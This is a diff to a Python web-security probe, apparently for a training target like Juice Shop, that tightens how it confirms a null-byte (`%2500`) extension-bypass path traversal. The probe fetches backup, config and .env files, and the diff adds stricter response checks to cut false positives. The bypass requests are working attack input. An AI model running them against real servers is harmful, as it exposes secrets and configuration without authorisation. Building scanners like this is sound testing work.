@@ -43,25 +43,66 @@ from lib import Probe, Verdict, SafeClient   # noqa: E402
 # We try the bypass form `<base-path>/<filename>%2500.<allowed-ext>`
 # against each. Only fires when the response body looks like the
 # non-markdown content the bug is supposed to expose.
+#
+# Each `body_signature_re` is applied to the response text only after
+# the catch-all guards have passed (200 status, non-HTML content-type,
+# no redirect, body doesn't contain login/HTML markers). The regex on
+# its own is intentionally not strong enough to defend against a
+# server that returns an HTML login page on every unknown path; the
+# `_response_disqualified` filter in run() is what closes that hole.
 TARGETED_FILES = (
     # (base_path, filename, allowed-ext, body_signature_re, what_it_is)
     ("/ftp", "package.json.bak", ".md",
-     r'"dependencies"\s*:', "Node package manifest backup"),
+     # Require BOTH dependencies and version keys — single-key match
+     # would otherwise accept arbitrary JSON config files.
+     r'"dependencies"\s*:.*"version"\s*:|"version"\s*:.*"dependencies"\s*:',
+     "Node package manifest backup"),
     ("/ftp", "coupons_2013.md.bak", ".md",
-     r"^[A-Za-z0-9+/=]{6,}\s*$", "encoded coupon list"),
+     # At least three consecutive base64-shaped lines anchored to line
+     # start/end. The old `[A-Za-z0-9+/=]{6,}` matched `doctype` from
+     # `<!doctype html>` in any HTML page; this requires the line itself
+     # to BE base64-shaped, so an HTML page cannot match.
+     r"(?m)^[A-Za-z0-9+/=]{16,}$\n^[A-Za-z0-9+/=]{16,}$\n^[A-Za-z0-9+/=]{16,}$",
+     "encoded coupon list"),
     ("/ftp", "suspicious_errors.yml", ".md",
-     r"^- |\bSQLITE_ERROR\b", "internal error log"),
+     # Multiple YAML bullets, not just one stray dash.
+     r"(?m)^- .+\n^- .+|\bSQLITE_ERROR\b",
+     "internal error log"),
     ("/ftp", "quarantine/", ".md",
      r"<title>[^<]*listing", "quarantine directory listing"),
     ("/files", "config.bak", ".md",
-     r'"\w+"\s*:', "JSON config backup"),
+     # JSON config — require at least two keys so any single `"foo":`
+     # in HTML/JS doesn't trip it.
+     r'"\w+"\s*:.*"\w+"\s*:', "JSON config backup"),
     ("/files", ".env", ".md",
-     r"^\s*[A-Z_]+=", "env file"),
+     r"(?m)^\s*[A-Z_]+=\S+", "env file"),
     ("/uploads", "config.bak", ".md",
-     r'"\w+"\s*:', "JSON config backup in uploads"),
+     r'"\w+"\s*:.*"\w+"\s*:', "JSON config backup in uploads"),
     ("/static", "config.json.bak", ".md",
-     r'"\w+"\s*:', "JSON config backup in static"),
+     r'"\w+"\s*:.*"\w+"\s*:', "JSON config backup in static"),
 )
+
+
+def _response_disqualified(r, requested_url: str):
+    """Return None when the response could plausibly be the target
+    file, else a short reason describing why it is not. Mirrors the
+    helper in path_traversal_ftp_download.py — both probes need the
+    same set of "this is obviously not the bug" guards (no 3xx, no
+    text/html, no silent redirect chase, no login-page markers)."""
+    if r.status != 200:
+        return f"status={r.status}"
+    if not r.body:
+        return "empty body"
+    if r.final_url and r.final_url != requested_url:
+        return f"redirected to {r.final_url}"
+    ctype = (r.headers.get("content-type")
+             or r.headers.get("Content-Type") or "").lower()
+    if "text/html" in ctype or "application/xhtml" in ctype:
+        return f"content-type={ctype} (HTML, not a file dump)"
+    text_lower = (r.text or "").lower()
+    if "<html" in text_lower or "<!doctype html" in text_lower:
+        return "body looks like an HTML page"
+    return None
 
 
 class PathTraversalExtensionBypassProbe(Probe):
@@ -98,16 +139,23 @@ class PathTraversalExtensionBypassProbe(Probe):
             # of `%00` — the URL parser decodes it to a literal NUL,
             # which the underlying file-handler stops reading at.
             url = urljoin(origin, f"{base}/{fn}%2500{allowed_ext}")
-            r = client.request("GET", url)
+            # follow_redirects=False prevents a 303→/login from being
+            # silently walked into a 200 HTML page that looser regexes
+            # could match.
+            r = client.request("GET", url, follow_redirects=False)
             row: dict = {"base": base, "filename": fn,
                          "url": url, "status": r.status, "size": r.size,
                          "what": what}
-            if r.status == 200 and r.body:
-                if re.search(body_re, r.text, re.MULTILINE):
-                    row["bypassed"] = True
-                    row["body_match"] = re.search(
-                        body_re, r.text, re.MULTILINE).group(0)[:120]
-                    confirmed.append(row)
+            disq = _response_disqualified(r, url)
+            if disq:
+                row["rejected"] = disq
+                attempts.append(row)
+                continue
+            m = re.search(body_re, r.text, re.MULTILINE)
+            if m:
+                row["bypassed"] = True
+                row["body_match"] = m.group(0)[:120]
+                confirmed.append(row)
             attempts.append(row)
             if confirmed:
                 break
